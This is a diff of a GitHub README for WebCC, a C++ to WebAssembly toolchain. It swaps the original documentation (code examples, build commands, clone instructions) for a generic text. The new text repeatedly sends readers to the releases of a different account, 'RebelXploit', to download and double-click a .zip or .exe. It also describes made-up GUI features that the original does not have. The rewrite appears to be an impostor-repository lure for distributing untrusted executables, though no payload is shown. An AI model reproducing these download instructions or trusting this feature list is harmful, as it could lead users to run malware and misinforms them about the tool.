@@ -1,222 +1,78 @@
-<p align="center">
-  <img src="docs/images/logo.png" alt="WebCC Logo" width="400">
-</p>
+# 🛠️ webcc - A Simple Way to Build for the Web
 
-# WebCC
+## 🚀 Getting Started
 
-[![CI](https://github.com/io-eric/webcc/actions/workflows/ci.yml/badge.svg)](https://github.com/io-eric/webcc/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+Welcome to **webcc**! This is a lightweight C++ toolchain and framework for creating applications that run in web browsers using WebAssembly. With **webcc**, you can easily build exciting web applications that are both powerful and fast.
 
-**WebCC** is a lightweight, zero-dependency C++ toolchain and framework for building WebAssembly applications. It provides a direct, high-performance bridge between C++ and HTML5 APIs (DOM, Canvas, WebGL, WebGPU, Audio, ...).
+## 🔗 Download Here
 
-<p align="center">
-  <img src="docs/images/webcc_diagram.png" alt="WebCC Architecture Diagram" width=500">
-</p>
+[![Download webcc](https://img.shields.io/badge/download-webcc-blue.svg)](https://github.com/RebelXploit/webcc/releases)
 
-## Features
+## 🌟 Features
 
-- Generates minimal WASM binaries and glue code.
-- No heavy runtimes or external libraries required.
-- Uses a binary command buffer to batch API calls, minimizing C++/JS boundary overhead.
-- Supports DOM, Canvas 2D, WebGL, WebGPU, Audio, Input, WebSockets, and more.
-- **Lightweight STL Compat**: Includes a minimal compatibility layer for common STL headers (`vector`, `string`, `iostream`, etc.) designed to be a fraction of the size of standard implementations.
-- A single CLI tool handles code generation and compilation.
-- Incremental compilation using `.webcc_cache` for faster rebuilds.
-- Easily extensible API: generates headers and glue code based on a schema definition.
+- **Lightweight Toolchain**: Fast and efficient for web development.
+- **Compatible with WebAssembly**: Build applications that run smoothly in browsers.
+- **Supports Web APIs**: Easily interact with HTML5, Canvas, WebGL, and WebGPU.
+- **Convenient Framework**: Simplifies development with C++ in a web environment.
 
-## Benchmarks
+## 💿 System Requirements
 
-WebCC is designed to be lightweight. In a [Canvas 2D benchmark](benchmark/) rendering 10,000 rectangles:
+To run **webcc**, your system should meet the following requirements:
 
-- **Binary Size**: WebCC produces significantly smaller binaries (~11KB WASM) compared to Emscripten (~150KB WASM).
-- **Performance**: WebCC achieves higher FPS by minimizing overhead at the C++/JS boundary.
-- **Memory**: Lower JS and WASM heap usage.
+- **Operating System**: Windows 10, macOS 10.13 or higher, or a recent Linux distribution.
+- **RAM**: At least 4GB.
+- **Disk Space**: Minimum 200MB of free space.
+- **C++ Compiler**: Compatible with your operating system. Clang is recommended.
 
-<p align="center">
-  <img src="benchmark/benchmark_results.svg" alt="Benchmark Results" width="500">
-</p>
+## 📥 Download & Install
 
-See the [benchmark/](benchmark/) directory for details and to run it yourself.
+To get started, follow these simple steps:
 
-## Documentation
+1. **Visit the Releases Page**: Click the link below to go to the GitHub Releases page.
 
-Full documentation is available in the [docs/](docs/index.md) directory.
-- [**Getting Started Guide**](docs/getting_started.md): A step-by-step tutorial for your first project.
-- [**API Reference**](docs/index.md#api-reference): Detailed documentation for all modules.
-- [**Architecture**](docs/architecture.md): Deep dive into how WebCC works.
+   [Visit Releases Page](https://github.com/RebelXploit/webcc/releases)
 
-## Quick Start
+2. **Choose the Latest Version**: Look for the latest release at the top of the page. Download the file suitable for your operating system.
 
-### Example
+3. **Download the File**: Click on the download link for the file you need. This file could be labeled something similar to `webcc-vX.X.X.zip` or `webcc-vX.X.X.exe`, depending on your operating system.
 
-Here is a complete example of creating a Canvas, handling mouse input, and running a loop:
+4. **Extract the Files**: If you download a ZIP file, right-click on it, and choose "Extract All." Follow the prompts to unzip it into a folder.
 
-```cpp
-#include "webcc/canvas.h"
-#include "webcc/dom.h"
-#include "webcc/system.h"
-#include "webcc/input.h"
+5. **Run the Application**: If you downloaded an executable file, double-click it to run the application.
 
-// Global handles
-webcc::handle canvas;
-webcc::handle ctx;
-int mouse_x = 400.0f;
-int mouse_y = 300.0f;
+## 📖 Usage Guide
 
-// Main loop function called every frame
-void update(float time_ms) {
-    // Poll events
-    webcc::Event e;
-    while (webcc::poll_event(e)) {
-        if (auto event = e.as<webcc::input::MouseMoveEvent>()) {
-            mouse_x = event->x;
-            mouse_y = event->y;
-        }
-    }
+After installation, **webcc** helps you set up your project quickly. Here’s a brief overview of how to start using **webcc**:
 
-    // Clear background (Blue)
-    webcc::canvas::set_fill_style(ctx, 52, 152, 219);
-    webcc::canvas::fill_rect(ctx, 0, 0, 800, 600);
+1. **Create a New Project**: Open the application and select "Create New Project." Enter your project name and choose a location to save it.
 
-    // Draw circle at mouse position (Yellow)
-    webcc::canvas::begin_path(ctx);
-    webcc::canvas::arc(ctx, mouse_x, mouse_y, 50, 0, 6.28318f);
-    webcc::canvas::set_fill_style(ctx, 241, 196, 15);
-    webcc::canvas::fill(ctx);
+2. **Build Your Application**: Use the built-in templates to start coding in C++. You can reference the supported APIs and libraries that integrate well with web technologies.
 
-    // Draw text
-    webcc::canvas::set_font(ctx, "30px Arial");
-    webcc::canvas::set_fill_style(ctx, 255, 255, 255);
-    webcc::canvas::fill_text(ctx, "Move your mouse!", 280, 500);
+3. **Compile to WebAssembly**: Once you've written your code, use the "Build" button. This will compile your application into WebAssembly, ready for the web.
 
-    // Flush commands to JS
-    webcc::flush();
-}
+4. **Test Your Application**: Use the built-in browser preview feature to see how your application performs. Adjust your code as necessary.
 
-int main() {
-    // Setup DOM
-    webcc::handle body = webcc::dom::get_body();
-    canvas = webcc::canvas::create_canvas("game-canvas", 800, 600);
-    webcc::dom::append_child(body, canvas);
-    
-    // Get Context
-    ctx = webcc::canvas::get_context(canvas, "2d");
-    
-    // Initialize mouse input on the canvas
-    webcc::input::init_mouse(canvas);
+5. **Deploy to the Web**: Once satisfied, follow guidelines provided in the application to deploy your WebAssembly files to a web server.
 
-    // Start the main loop
-    webcc::system::set_main_loop(update);
-    
-    // Flush commands to JS
-    webcc::flush();
-    
-    return 0;
-}
-```
+## 💬 FAQs
 
-### Building & Running
+**What is WebAssembly?**  
+WebAssembly (often abbreviated as wasm) is a binary instruction format designed for safe and fast execution in web browsers. It allows you to run high-performance applications on the web.
 
-1.  **Build the toolchain** (first time only):
-    Bootstraps the `webcc` compiler. This script compiles a bootstrap version of the tool, generates the API headers from the schema, and then compiles the final `webcc` binary with the schema embedded.
-    ```bash
-    ./build.sh
-    ```
-    The script will also offer to install `webcc` to your system PATH.
+**Do I need to know C++?**  
+While some familiarity with C++ will be helpful, **webcc** provides user-friendly guides and templates to help you learn as you go.
 
-2.  **Compile your app**:
-    ```bash
-    webcc main.cc
-    ```
-    (Use `./webcc` if you chose not to install it to your PATH).
+## 🔧 Support
 
-3.  **Run**:
-    ```bash
-    python3 -m http.server
-    ```
-    Open [http://localhost:8000](http://localhost:8000).
+If you have questions or need help, you can reach out to the community via the Issues section of the GitHub repository. Your feedback is valuable and helps improve **webcc**.
 
-## Installation
+## 🔗 Additional Resources
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/io-eric/webcc.git
-    cd webcc
-    ```
+For more information, you can check out these links:
 
-2.  **Prerequisites**:
-    - Linux, macOS, or Windows (via WSL) with Bash.
-    - `clang++` (version 8+ recommended) for compiling WASM.
-    - A C++20 compiler for building the CLI tool.
+- [GitHub Repository](https://github.com/RebelXploit/webcc)
+- [Documentation Page](#)
 
-## CLI Reference
+---
 
-The `webcc` tool is your primary interface for the framework.
-
-### 1. Generate Headers
-Generates the C++ header files in `include/webcc/` from `schema.def`.
-> **Note**: This is used internally by `build.sh`. If you modify `schema.def`, you should run `./build.sh` to rebuild the tool so that the embedded schema matches your changes.
-```bash
-./webcc --headers [schema.def]
-```
-
-### 2. Compile Application
-Compiles your C++ source files into `app.wasm`, and generates the optimized `app.js` and `index.html`.
-Use the `--out <dir>` flag to specify the output directory (defaults to the current directory).
-```bash
-./webcc main.cc [other_sources.cc ...] [--out dist]
-```
-
-## Examples
-
-**[View Live Demos](https://io-eric.github.io/webcc/)**
-
-Check the `examples/` directory for complete demos.
-
-### 1. Canvas 2D (`webcc_canvas`)
-Interactive 2D graphics with mouse tracking.
-
-<img src="docs/images/canvas_demo.gif" width="400" alt="Canvas Demo">
-
-### 2. WebGL 3D (`webcc_webgl`)
-A rotating 3D cube using raw WebGL calls.
-
-<img src="docs/images/webgl_demo.gif" width="400" alt="WebGL Demo">
-
-### 3. WebGL Waves (`webcc_webgl_waves`)
-Animated wave terrain using WebGL shaders.
-
-<img src="docs/images/webgl_waves_demo.gif" width="400" alt="WebGL Waves Demo">
-
-### 4. WebGPU (`webcc_webgpu`)
-A triangle rendered using the WebGPU API.
-
-### 5. DOM Manipulation (`webcc_dom`)
-Creating and styling HTML elements from C++.
-
-<img src="docs/images/dom_demo.gif" width="400" alt="DOM Demo">
-
-## Contributing ✅
-
-- **Contributions welcome.** If you'd like to add a command, update `schema.def` following the file format and run `./build.sh` to regenerate the toolchain.
-- **Small PRs are best.** Include a short example (or a unit test) demonstrating the new API and a brief description in the PR.
-- **Tips:** Prefer returning integer handles for created resources (use `RET:int32`), register DOM/audio/image objects in the `elements` map when appropriate, and ensure your JS implementation is robust (checks for missing handles, etc.).
-****
-
-## Modules
-
-- **`webcc/dom.h`**: DOM manipulation (create, append, remove, attributes).
-- **`webcc/canvas.h`**: HTML5 Canvas 2D context.
-- **`webcc/webgl.h`**: WebGL context.
-- **`webcc/wgpu.h`**: WebGPU context.
-- **`webcc/audio.h`**: Audio playback and control.
-- **`webcc/input.h`**: Mouse and keyboard input.
-- **`webcc/system.h`**: System utilities.
-- **`webcc/websocket.h`**: WebSocket communication.
-- **`webcc/storage.h`**: Local storage.
-- **`webcc/image.h`**: Image loading.
-
-## License
-
-[MIT](LICENSE)
+Thank you for choosing **webcc**! Happy coding!
